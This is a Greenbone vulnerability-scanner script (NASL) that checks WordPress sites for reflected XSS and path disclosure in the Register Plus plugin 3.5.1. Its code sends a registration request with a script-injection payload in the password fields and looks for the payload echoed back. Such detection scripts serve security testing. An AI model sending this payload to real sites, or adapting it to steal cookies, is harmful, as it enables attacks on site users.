# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801492");
  script_version("2023-10-27T05:05:28+0000");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2010-12-27 09:55:05 +0100 (Mon, 27 Dec 2010)");
  script_cve_id("CVE-2010-4402", "CVE-2010-4403");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("WordPress Register Plus Plugin Multiple Vulnerabilities");
  script_xref(name:"URL", value:"http://websecurity.com.ua/4539");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45057");
  script_xref(name:"URL", value:"http://secunia.com/advisories/42360");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/96143/registerplus-xss.txt");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/514903/100/0/threaded");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to execute
  arbitrary HTML and script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"WordPress Register Plus 3.5.1");

  script_tag(name:"insight", value:"The flaws are due to:

  - Input passed via the 'firstname', 'lastname', 'website', 'aim', 'yahoo',
  'jabber', 'about', 'pass1', and 'pass2' parameters to 'wp-login.php'
  (when 'action' is set to 'register') is not properly sanitised before being
  returned to the user.

  - A direct request to 'dash_widget.php' and 'register-plus.php' allows
  remote attackers to obtain installation path in an error message.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"WordPress Register Plus Plugin is prone to multiple vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

useragent = http_get_user_agent();
filename = dir + "/wp-login.php?action=register";
authVariables = "user_login=abc&user_email=abc%40gmail&firstname=&lastname=" +
                "&website=&aim=&yahoo=&jabber=&about=&pass1=%22%3E%3Cscript" +
                "%3Ealert%28document.cookie%29%3C%2Fscript%3E&pass2=%22%3E%" +
                "3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E";

# nb: http_host_name() should be always after the static string(s) above but always after any
# dynamically ones (e.g. a random string) which should be different for each hostname.
host = http_host_name( port:port );

req2 = string("POST ", filename, " HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
              "User-Agent: ", useragent, "\r\n",
              "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
              "Accept-Language: en-us,en;q=0.5\r\n",
              "Accept-Encoding: gzip,deflate\r\n",
              "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
              "Keep-Alive: 115\r\n",
              "Connection: keep-alive\r\n",
              "Referer: http://", host, filename, "\r\n",
              "Cookie: wordpress_test_cookie=WP+Cookie+check; wpss_firstvisit=1; wpss_safesearch=1\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: ", strlen(authVariables), "\r\n\r\n",
               authVariables);

res2 = http_keepalive_send_recv(port:port, data:req2);

if(egrep(pattern:"^HTTP/1\.[01] 200", string:res2) &&
   "><script>alert(document.cookie)</script>" >< res2) {
  report = http_report_vuln_url(port:port, url:filename);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
